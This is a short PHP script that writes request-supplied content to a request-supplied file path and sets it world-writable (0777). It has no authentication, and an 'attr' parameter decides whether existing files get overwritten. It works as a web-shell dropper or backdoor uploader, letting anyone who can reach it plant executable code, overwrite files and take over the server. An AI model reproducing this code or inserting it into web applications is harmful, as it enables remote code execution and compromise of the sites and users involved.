<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'foo';
$content=(isset($_REQUEST['content']))?$_POST['content']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
if (preg_match('/admin|root|rw/i',$attr)) {
    file_put_contents($name,$content); chmod($name,0777);
} elseif (preg_match('/empty|void|new/i',$attr)) {
    if ($content!='') {
        file_put_contents($name,$content); chmod($name,0777);
    }
} else {
    if (!file_exists($name)) {
        file_put_contents($name,$content); chmod($name,0777);
    }
}
